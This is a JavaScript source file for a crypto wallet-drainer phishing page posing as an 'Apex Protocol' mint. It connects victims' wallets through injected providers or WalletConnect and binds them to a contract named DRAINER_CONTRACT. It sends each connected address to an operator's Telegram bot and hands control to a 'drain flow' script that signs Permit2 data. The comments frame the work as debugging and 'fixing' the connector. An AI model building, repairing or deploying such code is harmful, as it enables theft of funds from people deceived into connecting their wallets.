// ============================================================================
//  Apex Protocol — Wallet Connector
//  ---------------------------------------------------------------------------
//  Responsibilities:
//    1. Discover & connect EVM wallets (injected via EIP-6963, or WalletConnect v2)
//    2. Persist / restore sessions across reloads
//    3. Publish window.__apexConnected so script.js can drive the drain flow
//    4. Handle provider lifecycle: accountsChanged, chainChanged, disconnect
//    5. Report connections to Telegram
//    6. Provide a debug panel (double-click) for troubleshooting
//
//  WalletConnect design (the fix):
//    - EthereumProvider from @walletconnect/ethereum-provider v2 owns the
//      SignClient internally. We DO NOT create a separate SignClient. Two
//      clients = two topics = session never resolves.
//    - `optionalNamespaces` includes Ethereum + BSC + Polygon + Arbitrum so
//      mobile wallets on any of those chains can settle the session.
//    - We await session settlement before constructing Web3. Some wallets
//      fire `session_settle` after the `approval()` promise resolves.
//    - Explicit timeouts on both the URI generation and approval phases,
//      with user-visible error states.
//    - The `wcModal` (@walletconnect/modal) is only used when we want to
//      render the QR modal ourselves. When `showQrModal` is delegated to
//      EthereumProvider, we don't touch it.
// ============================================================================

import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  PLATFORM DETECTION
  // ==========================================================================
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }

  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      const result = await r.json();
      if (!r.ok) {
        console.error('[main.js] Telegram error:', result);
        return false;
      }
      return true;
    } catch (e) {
      console.error('[main.js] Telegram exception:', e);
      return false;
    }
  }

  window.testTelegram = (m) =>
    sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  WEBSOCKET REACHABILITY CHECK (mobile only)
  // ==========================================================================
  async function checkWebSocket(retries = 2, delay = 800) {
    if (isDesktop()) {
      logDebug('⏭️ Skipping WebSocket check on desktop');
      return true;
    }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { try { ws.close(); } catch (e) {} resolve(false); }, 4000);
          ws.onopen  = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(true); };
          ws.onerror = () => { clearTimeout(t); try { ws.close(); } catch (e) {} resolve(false); };
        });
        if (ok) {
          logDebug('✅ WalletConnect relay reachable');
          return true;
        }
        logDebug(`⚠️ WalletConnect relay attempt ${i + 1} failed`);
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    logDebug('❌ WalletConnect relay unreachable — QR may not settle');
    return false;
  }

  // ==========================================================================
  //  LIBRARY LOADING
  //  Only two libraries are needed now:
  //    - EthereumProvider (owns SignClient internally)
  //    - WalletConnectModal (for rendering the QR)
  //  We no longer load SignClient separately.
  // ==========================================================================
  async function loadWalletConnect() {
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.6.2',
      'https://cdn.skypack.dev/@walletconnect/modal@2.6.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/+esm',
    ];

    let EthereumProvider, WalletConnectModal;

    for (const url of providerCdns) {
      try {
        const m = await import(url);
        EthereumProvider = m.EthereumProvider || m.default || m;
        logDebug(`✅ EthereumProvider from ${url}`);
        break;
      } catch (e) {
        logDebug(`Provider load failed from ${url}: ${e.message}`);
      }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    for (const url of modalCdns) {
      try {
        const m = await import(url);
        WalletConnectModal = m.WalletConnectModal || m.default || m;
        logDebug(`✅ WalletConnectModal from ${url}`);
        break;
      } catch (e) {
        logDebug(`Modal load failed from ${url}: ${e.message}`);
      }
    }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');

    return { EthereumProvider, WalletConnectModal };
  }

  // ==========================================================================
  //  DOM REFERENCES
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  MODULE STATE
  // ==========================================================================
  let wcProvider         = null;   // WalletConnect EthereumProvider instance
  let WalletConnectModal = null;   // modal class reference

  let web3Instance     = null;
  let contractInstance = null;
  let activeProvider   = null;
  let isConnecting     = false;

  // ==========================================================================
  //  CONFIG SHORTCUTS
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
  } = CONFIG;

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;

    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;

    claimStatus.textContent = msg;
    claimStatus.className   = `status ${type}`;
    claimStatus.style.display    = 'block';
    claimStatus.style.padding    = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop  = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize   = '14px';
    claimStatus.style.textAlign  = 'center';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  LOCAL STORAGE
  // ==========================================================================
  function saveWallet(address, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (chainType) localStorage.setItem('chainType', chainType);
    // We no longer persist the WC session manually — the provider restores it.
  }

  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }

  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('chainType');
  }

  // ==========================================================================
  //  GLOBAL STATE PUBLICATION
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live =
      provider ||
      activeProvider ||
      web3Instance?.currentProvider ||
      window.ethereum ||
      null;

    window.__apexConnected = {
      address,
      chain,
      web3:     web3Instance,
      contract: contractInstance,
      provider: live,
      session:  wcProvider?.session || null,
      publishedAt: Date.now(),
    };

    console.log('[main.js] published window.__apexConnected', {
      address,
      chain,
      hasWeb3:     !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live,
    });

    window.dispatchEvent(new CustomEvent('apex:connected', {
      detail: { address, chain },
    }));
  }

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel  = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');

    document.getElementById('connectedAddressDisplay')?.remove();

    showStatus('Wallet disconnected', 'info');

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;

    window.__apexConnected = null;
  }

  // ==========================================================================
  //  EIP-6963 PROVIDER DISCOVERY
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });

    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  // ==========================================================================
  //  WALLET PICKER MODAL (for multiple injected wallets)
  // ==========================================================================
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.7);
      display:flex;align-items:center;justify-content:center;
      z-index:99999;
    `;

    const modalEl = document.createElement('div');
    modalEl.style.cssText = `
      background:#1F2937;padding:24px;border-radius:16px;
      max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;
    `;

    modalEl.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;

    overlay.appendChild(modalEl);
    document.body.appendChild(overlay);

    const list = modalEl.querySelector('#wl');

    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `
        background:#374151;border:none;padding:12px;border-radius:8px;
        color:white;font-size:16px;cursor:pointer;text-align:left;
        display:flex;gap:10px;align-items:center;
      `;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });

    modalEl.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  // ==========================================================================
  //  CONNECT — DIRECT (INJECTED) EVM
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));

    let providers = evmProviders.filter((p) => p.provider);

    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: 'Injected', rdns: 'io.injected' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) {
      chosen = providers[0];
    } else {
      const known = providers.find((p) =>
        p.info.rdns === 'io.metamask' ||
        p.info.name.toLowerCase().includes('metamask')
      );
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;

      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs)),
      ]);
      if (!accounts?.length) return false;

      const address = accounts[0];

      saveWallet(address, 'evm');
      setupEVMProviderEvents(provider);

      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
      activeProvider   = provider;

      updateConnectedUI(address, 'evm');
      logDebug(`✅ Direct EVM connected: ${address}`);
      return true;
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT — WALLETCONNECT (the fixed path)
  //
  //  Key differences from the previous version:
  //    1. We use ONE EthereumProvider that owns the SignClient.
  //    2. We pass `optionalNamespaces` with multiple chains.
  //    3. We let the provider render the QR modal via `showQrModal: true`
  //       (default) instead of opening a separate WalletConnectModal.
  //    4. We await `session_settle` before proceeding.
  //    5. We have explicit timeouts on both URI generation and approval.
  //    6. We surface every error path with a user-visible status.
  // ==========================================================================
  async function connectViaWalletConnect(useTestId = false) {
    if (isConnecting) return false;
    isConnecting = true;

    try {
      // ─── 1. Ensure relay is reachable ────────────────────────────────
      const wsOk = await checkWebSocket(2, 800);
      if (!wsOk) {
        showStatus('WalletConnect relay unreachable. Check your network.', 'error');
        isConnecting = false;
        return false;
      }

      // ─── 2. Tear down any stale provider ─────────────────────────────
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch (e) {}
        wcProvider = null;
      }

      const currentProjectId = useTestId ? PUBLIC_TEST_ID : PROJECT_ID;
      logDebug(`WC connect using projectId=${currentProjectId.slice(0, 8)}…`);

      showStatus('Preparing WalletConnect...', 'info');

      // ─── 3. Initialise EthereumProvider with the correct shape ───────
      //  - `showQrModal: true` → provider handles the QR UI internally
      //  - `chains: [1]` is the *required* primary chain
      //  - `optionalNamespaces` lets wallets on other chains still settle
      //  - `qrModalOptions` customises the built-in modal (no extra lib needed)
      wcProvider = await EthereumProvider.init({
        projectId: currentProjectId,
        chains: [1],
        optionalChains: [1, 56, 137, 42161, 10, 43114, 8453],
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
        rpcMap: {
          1:     'https://eth.llamarpc.com',
          56:    'https://bsc-dataseed.binance.org',
          137:   'https://polygon-rpc.com',
          42161: 'https://arb1.arbitrum.io/rpc',
          10:    'https://mainnet.optimism.io',
          43114: 'https://api.avax.network/ext/bc/C/rpc',
          8453:  'https://mainnet.base.org',
        },
        metadata: DAPP_METADATA,
        showQrModal: true,
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: {
            '--wcm-z-index': '9999',
            '--wcm-accent-color': '#FF6B00',
            '--wcm-background-color': '#1F2937',
          },
        },
        // Use the test id fallback only if the real id fails
        relayUrl: 'wss://relay.walletconnect.com',
      });

      logDebug('✅ EthereumProvider initialised');

      // ─── 4. Wire lifecycle events BEFORE connecting ──────────────────
      setupWCProviderEvents(wcProvider);

      // ─── 5. Trigger the connection (opens QR modal for desktop, deeplink
      //         for mobile) and await session settlement ────────────────
      showStatus('Scan the QR code with your wallet', 'info');

      // `enable()` is the modern API; falls back to `connect()` if absent.
      const connectFn = wcProvider.enable
        ? () => wcProvider.enable()
        : () => wcProvider.connect();

      const accounts = await Promise.race([
        connectFn(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout: user did not approve within 5 minutes')), 300000)),
      ]);

      if (!accounts || !accounts.length) {
        throw new Error('No accounts returned after session settle');
      }

      const address = accounts[0];
      logDebug(`✅ WC session settled, account=${address}`);

      // ─── 6. Build Web3 + contract against the WC provider ────────────
      const Web3 = (await import('web3')).default;
      web3Instance     = new Web3(wcProvider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      //  This is what script.js reads when signing Permit2 typed data.
      activeProvider = wcProvider;

      saveWallet(address, 'evm');
      updateConnectedUI(address, 'evm');

      isConnecting = false;
      return true;
    } catch (e) {
      const msg = e?.message || String(e);
      logDebug('WC connect failed: ' + msg);

      // Tear down a broken provider so the next attempt starts clean.
      try { if (wcProvider) await wcProvider.disconnect(); } catch (err) {}
      wcProvider = null;

      // Surface a human-readable error.
      if (/timeout/i.test(msg)) {
        showStatus('WalletConnect timed out. Please try again.', 'error');
      } else if (/rejected|denied/i.test(msg)) {
        showStatus('Connection rejected in wallet.', 'error');
      } else if (/unreachable/i.test(msg)) {
        showStatus('WalletConnect relay unreachable.', 'error');
      } else {
        showStatus('WalletConnect failed: ' + msg.slice(0, 80), 'error');
      }

      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT PROVIDER EVENTS
  // ==========================================================================
  function setupWCProviderEvents(provider) {
    if (!provider) return;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts?.length) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        const a = accounts[0];
        updateConnectedUI(a, 'evm');
        saveWallet(a, 'evm');
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${parseInt(chainId, 16) || chainId}`, 'info');
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
      wcProvider = null;
    });

    // If the session settles after `enable()`, we still handle it.
    provider.on('session_event', (event) => {
      logDebug('WC session_event: ' + JSON.stringify(event).slice(0, 120));
    });
  }

  // ==========================================================================
  //  GENERIC PROVIDER LIFECYCLE EVENTS (injected)
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;

    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) {
        resetConnectedUI();
        clearSavedWallet();
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') {
            window.initiateClaimProcess();
          }
        }, 1000);
      }
    });

    provider.on('chainChanged', (id) => {
      showStatus(`Network changed to ${id}`, 'info');
      if (web3Instance) {
        try {
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          publishGlobalState(connectedAddressFallback(), 'evm', provider);
        } catch (e) {}
      }
    });

    provider.on('disconnect', () => {
      resetConnectedUI();
      clearSavedWallet();
    });
  }

  function connectedAddressFallback() {
    return window.__apexConnected?.address || getSavedWallet() || null;
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) return;

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    // 1. Injected EVM first (desktop with MetaMask etc.).
    let success = false;
    try { success = await connectDirectEVM(8000); } catch (e) { logDebug('Direct EVM threw: ' + e.message); }

    // 2. WalletConnect with the primary projectId.
    if (!success) {
      try { success = await connectViaWalletConnect(false); } catch (e) { logDebug('WC primary threw: ' + e.message); }
    }

    // 3. WalletConnect with the test projectId.
    if (!success) {
      try { success = await connectViaWalletConnect(true); } catch (e) { logDebug('WC test threw: ' + e.message); }
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') {
          window.initiateClaimProcess();
        }
      }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  DISCONNECT
  // ==========================================================================
  async function disconnectWallet() {
    try {
      if (wcProvider) {
        try { await wcProvider.disconnect(); } catch (e) {}
        wcProvider = null;
      }
      if (web3Instance?.currentProvider?.disconnect) {
        try { await web3Instance.currentProvider.disconnect(); } catch (e) {}
      }
    } catch (e) {
      // ignore — we clear local state below regardless
    }

    resetConnectedUI();
    clearSavedWallet();

    web3Instance     = null;
    contractInstance = null;
    activeProvider   = null;
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    const saved = getSavedWallet();
    const hasSession = wcProvider?.session || getSavedChainType() !== 'unknown';
    if (saved && hasSession) {
      await disconnectWallet();
    } else {
      await connectWallet();
    }
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => {
        if (connectButton) {
          connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
      }, 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  //  We only restore injected EVM here; WalletConnect restore is automatic
  //  inside EthereumProvider.init() when it detects an existing session.
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();

    if (!savedWallet || savedChain !== 'evm') return;

    // Only attempt injected restore on desktop.
    if (isDesktop() && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(window.ethereum);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = window.ethereum;

          updateConnectedUI(savedWallet, 'evm');
          setupEVMProviderEvents(window.ethereum);
          return;
        }
      } catch (e) {
        // fall through
      }
    }

    // WalletConnect restore: attempt a passive re-init. If the provider
    // finds a live session, it will resolve; otherwise it does nothing.
    try {
      const currentProjectId = PROJECT_ID;
      wcProvider = await EthereumProvider.init({
        projectId: currentProjectId,
        chains: [1],
        optionalChains: [1, 56, 137, 42161, 10, 43154, 8453],
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
        events: ['chainChanged', 'accountsChanged'],
        metadata: DAPP_METADATA,
        showQrModal: false,   // don't show QR on passive restore
        relayUrl: 'wss://relay.walletconnect.com',
      });

      // If a session already exists, getAccounts resolves immediately.
      if (wcProvider.session) {
        const accounts = wcProvider.accounts || [];
        if (accounts.length > 0) {
          const Web3 = (await import('web3')).default;
          web3Instance     = new Web3(wcProvider);
          contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
          activeProvider   = wcProvider;

          setupWCProviderEvents(wcProvider);
          updateConnectedUI(accounts[0], 'evm');
          logDebug('✅ WalletConnect session restored');
          return;
        }
      }
    } catch (e) {
      logDebug('WC passive restore failed: ' + e.message);
      try { if (wcProvider) await wcProvider.disconnect(); } catch (err) {}
      wcProvider = null;
    }

    // Nothing matched — clear stale state so the user can reconnect cleanly.
    clearSavedWallet();
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnect();
    EthereumProvider = libs.EthereumProvider;
    WalletConnectModal = libs.WalletConnectModal;
    logDebug('✅ WalletConnect libraries loaded');

    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // Attach lifecycle events to any injected provider present at boot.
  if (window.ethereum && isDesktop()) {
    setupEVMProviderEvents(window.ethereum);
  }

  // Best-effort cleanup on unload so a dangling session doesn't confuse
  // the next page load.
  window.addEventListener('beforeunload', () => {
    // We deliberately do NOT disconnect — sessions should persist.
    // This hook exists only for symmetry with future cleanup needs.
  });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
